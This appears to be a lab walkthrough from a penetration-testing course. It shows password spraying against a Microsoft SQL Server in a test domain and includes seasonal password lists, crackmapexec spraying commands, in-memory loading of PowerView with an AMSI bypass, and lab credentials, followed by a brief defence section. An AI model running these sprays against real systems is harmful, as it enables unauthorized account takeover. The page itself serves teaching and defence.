# Weak passwords

## Configuring

### Prerequisite&#x20;

The weak passwords were configured during the creation of the SQL Server users and Domain users in the section "Enumerate Logins".

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Attacking

### How it works

SQL Servers can have two type of accounts that could connect to it. Domain user accounts and groups or SQL Server accounts. These accounts have access to the SQL server and might have higher privileges then we currently have. By spraying passwords against these user we might get access to them.

#### Password spraying

Password spraying is a type of brute force attack. An attacker will try a default password against a list of usernames. For example, an attacker uses the password `Welcome2022!` against many different accounts to avoid account lockout that would normally occur when brute-forcing a single account with many passwords.

A old habit what a lot of companies enforce is the requirement to change passwords every 30, 60 or 90 days. Which results in people changing their password often, forgetting it and eventually choosing a easy guessable password. Another habbit is adding a increment to the same password or using months/seasons. Which means we can easily create a password list of common passwords and things people would choose using following formats:

* season+year+! (Summer2022!)
* month+year+! (March2022!)
* companyname+year+! (Amsterdambank2022!)
* city+! (Amsterdam!)
* etc.

### Tools

* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)

### Executing the attack

1. So during the enumeration we discovered that there are three domain users or groups: `AMSTERDAM\richard`,  `BANK\administrator` and `AMSTERDAM\DatabaseUsers`.&#x20;
2. To check which of these are users and groups, login to `WS01` as `Richard` with the password `Sample123`.
3. Download PowerView on the kali machine and host it on a webserver:

```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
python3 -m http.server 8090
```

4\. Start PowerShell and download and execute an amsi and PowerView in memory:

![](<../../../../../.gitbook/assets/image (7).png>)

5\. Now we can query these objects using PowerView and the `Get-DomainObject` cmdlet. We already know who Richard is and the Administrator is a well known user. We will query DatabaseUsers:

```
Get-DomainObject DatabaseUsers
```

![](<../../../../../.gitbook/assets/image (52) (1).png>)

6\. The output shows us that the `DatabasUsers` is a group object and that `bob` is its only member.

7\. We already sprayed passwords at the SQL server during the initial access steps. We will do it again here. First we need to make a list of the enumerated logins, we will split them in `sqlusers.txt` and `domainusers.txt`.

```
# sqlusers.txt
Developer
Developer_test
testadmin
bob
SQLAdmin

# domainusers.txt
bob
```

8\. Secondly create a `passwords.txt` file and copy the following passwords like we did during the password spraying attack earlier and we will also add the usernames since sometimes admin set the username as the password:

```
Spring2022!
Winter2022!
Autumn2022!
Summer2022!
Welcome2022!
Bank2022!
AmsterdamBank2022!
Fall2022!
testadmin
bob
SQLAdmin
Developer
Developer_test
```

9\. First we will run Crackmapexec to connect to the MSSQL service running on `WEB01` and spray with local SQL users. We have to use the `--local-auth` flag otherwise it will spray under the domain context. We will also use the `--continue-on-success` flag so it doesn't stop after the first successfull hit.

```
crackmapexec mssql 10.0.0.5 -u sqlusers.txt -p passwords.txt --local-auth --continue-on-success | grep "+"
```

![](<../../../../../.gitbook/assets/image (12) (1) (1) (1).png>)

We found the password for three users and it seems thats `SQLAdmin` has sysadmin rights since it shows `Pwn3d!` , this means it has admin rights. Since we are spraying MSSQL logins this means sysadmin rights. If we were spraying with SMB it meant the user was localadmin on the machine.

10\. We can also run Crackmapexec with the domain context:

```
crackmapexec mssql 10.0.0.5 -u domainusers.txt -p passwords.txt --continue-on-success | grep "+"
```

![](<../../../../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1).png>)

We discovered the password of another user `bob`, but this time the Domain User. We already connected to the SQL service using both SQL accounts and Domain user accounts. This can be done with tools such as mssql-cli or heidiSQL.&#x20;

11\. Something we didn't show is that its possible to execute sql queries with crackmapexec:

```
crackmapexec mssql 10.0.0.5 -u SQLAdmin -p Winter2022! --local-auth -q "select @@version"
```

![](<../../../../../.gitbook/assets/image (36) (1).png>)

There will always be loads of tools which can do the same stuff, it will always come down to convenience and where you are used too or like the most. Check the executing commands page under SQL Server Attacks to read how to execute cmd commands:

{% content-ref url="../../executing-commands.md" %}
[executing-commands.md](../../executing-commands.md)
{% endcontent-ref %}

## Defending

### Recommendations

* Implement a strong password policy:

{% content-ref url="../../../../../defence/hardening/strong-password-policy.md" %}
[strong-password-policy.md](../../../../../defence/hardening/strong-password-policy.md)
{% endcontent-ref %}

### Detection



## References

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}

{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}
